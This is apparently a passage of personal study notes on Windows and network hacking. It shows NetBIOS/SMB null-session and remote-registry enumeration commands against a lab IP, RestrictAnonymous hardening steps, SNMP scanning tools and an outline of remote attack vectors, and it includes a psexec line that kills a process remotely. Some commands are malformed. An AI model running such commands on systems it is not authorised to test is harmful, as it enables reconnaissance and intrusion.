            C:\Windows\system32>net use
            New connections will be remembered.

            Status       Local     Remote                    Network

            -------------------------------------------------------------------------------
            OK                     \\192.168.2.128\IPC$      Microsoft Windows Network
            The command completed successfully.
            ```
            - file shares:
              net view \\
            - registry :
              reg query \\192.168.2.128\HKLM\Software\Microsoft\WindowsNT\CurrentVersion
            - trusted domains
            
            - users
              - dumpsec
              - sid2user
              - user2sid
            
            - all-in-one
              - winfingerprint
              - enum4linux.pl
          
        - NetBIOS enumeration countermeasuers
          - under windows 2000: unbinding WINS Client (TCP/IP) fromthe appropriate interface using the Network Control Panel’s Bindings tab
          - windows 2000 and above: unbinding File and Print Sharing for Microsoft Networks fromthe appropriate adapter
          - registry
            1. regjump HKLM\SYSTEM\CurrentControlSet\Control\LSA
              ```
              'Launches Registry Editor with the chosen branch open automatically
              'Author  : Ramesh Srinivasan
              'Website: http://windowsxp.mvps.org

              Set WshShell = CreateObject("WScript.Shell")

              Dim MyKey

              MyKey = Inputbox("Type the Registry path")

              MyKey = "My Computer\" & MyKey    ' for xp
              Mykey = "computer\" & MyKey       'windows 7

              WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit\Lastkey",MyKey,"REG_SZ"

              WshShell.Run "regedit", 1,True

              Set WshShell = Nothing
              ```
            2. set restrictanonymous = 1 (2 on windows 2000 and later)
              - 0—None. Rely on default permissions.

              - 1—Do not allow enumeration of Security Accounts Manager accounts and names.
                - userinfo.exe
                - userdump.exe
                - getacct
                ```
                reg query \\192.168.2.128\HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA /v restrictanonymous
                  HKEY_LOCAL_MACHINE\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA
                  restrictanonymous    REG_DWORD    0x0
                reg add \\192.168.2.128\HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA /v restrictanonymous /t REG_DWORD /d 0x1 /f 
                  The operation completed successfully.
                reg query \\192.168.2.128\HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA /v restrictanonymous
                  HKEY_LOCAL_MACHINE\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA
                  restrictanonymous    REG_DWORD    0x1
                ```
              - 2—No access without explicit anonymous permissions.
                To completely restrict access to CIFS/SMB info rmation on Windows 2000 and later systems, set the Additional 
                Restrictions For Anonymous Connections 
                ```
                reg add \\192.168.2.128\HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA /v restrictanonymous /t REG_DWORD /d 0x2 /f 
                  The operation completed successfully.

                psexec \\192.168.2.128 -w "C:\Program Files\SysinternalsSuite" "pskill" explorer
                

            3. ensuer the Registry is locked down and not accessible remotely
              [restrict remote registry](https://support.microsoft.com/en-us/help/153183/how-to-restrict-access-to-the-registry-from-a-remote-computer)
              ```

              reg query \\192.168.2.128\HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA /v restrictanonymous /t REG_DWORD /d 0x
              To create the registry key to restrict access to the registry:

              1. Start Registry Editor (Regedt32.exe) and go to the following subkey:
                HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
              2. On the Edit menu, click Add Key.
                Enter the following values:
                  Key Name: SecurePipeServers
                  Class: REG_SZ
              3. Go to the following subkey:
                HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers
                On the Edit menu, click Add Key.
                Enter the following values:
              Key Name: winreg
              Class: REG_SZ
              Go to the following subkey:
              HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg
              On the Edit menu, click Add Value.
              Enter the following values:
              Value Name: Description
              Data Type: REG_SZ
              String: Registry Server
              Go to the following subkey.
              HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg
              Select "winreg". Click Security and then click Permissions. Add users or groups to which you want to grant access.
              Exit Registry Editor and restart Windows.
              If you at a later stage want to change the list of users that can access the registry, repeat steps 10-12.

              ```

        - snmp udp 161
           - introduction
              provide intimate information about network devices, software, and systems. monitor network performance, audit network usage, 
              detect network faults or inappropriate access, and in some cases configure remote devices.
            - MIB :RFC 1213, “Management Information Base for Network Management of TCP/IP based Internets: MIB II.” A standard that 
                    defines a set of objects that represent information about IP and IPX components on your network, such as :
                    1. the list of network interfaces, 
                    2. the routing table, 
                    3. the Address Resolution Protocol (ARP) table, 
                    4. the list of open TCP connections, 
                    5. Internet Control Message Protocol (ICMP) statistics.
                    RFC 1213 is updated (but not made obsolete) by RFC 2011, “SNMPv2 Management Information Base for the Internet Protocol 
                    using SMIv2,” RFC 2012, “SNMPv2 Management Information Base for the Transmission Control Protocol using SMIv2,” and RFC 2013,
                     “SNMPv2 Management Information Base for the User Datagram Protocol using SMIv2.”
            - SMI :RFC 2578, “Structure of Management Information Version 2 (SMIv2).” A standard that describes the object syntax f
                    or specifying how MIB data is referenced and stored.
          - snmputil
          - snmpget
          - [snscan 1.05](mcafee.com/us/downloads/free-tools/snscan.aspx)
            192.168.2.131,161,"public","Linux centos.dob.com 2.6.32-642.11.1.el6.x86_64 #1 SMP Fri Nov 18 19:25:05 UTC 2016 x86_64"
          - onesixtyone

            


 # hacking windows
  - for in-depth coverage of Windows security architecture : Hacking exposed Windows, 3rd edition

  - unauthenticated attacks:
    1. starting only with knownledge of target system gained for infomation gathered before;
    2. remote network exploits;

    - primary vectors compromising windows system remotely include:
      - authentication spoofing:
        - frail password
        - bruteforce/dictionary password guessing
        - man-in-middle authentication spoofing

        - remote password guessing
          - windows file and print sharing service using SMB via tcp 445, udp 139(NetBIOS-based service)
          - RPC via tcp 135 
          - TS(terminal service) via tcp 3389
          - SQL on tcp 1433 and udp 1434
          - web-based product SP(SharePoint) over http and https(80, 443 or custome ports)
      
      - network service:
        - point-click-exploit tools to penetrate vulnerable service listening on the network
      
      - client vulnerabilities:
        - client software like IE, office, outlook, adobe flash play, adobe acobat reader and so on;

      - device drivers:
        - wireless network interfaces;
        - use memory sticks;
        - inserted media like cd-rom disk

      - 

  - ahtuenticated attacks:
    assume previous exploits succeed, the attacker now turns to do following:
    1. escalating priviledge;
    2. get remote control of victims;
    3. extracting passwords and other useful information;
    4. install backdoors;
    5. covering attacks;

  - windows security features
    - built-in os countermeasures and best practive against many exploits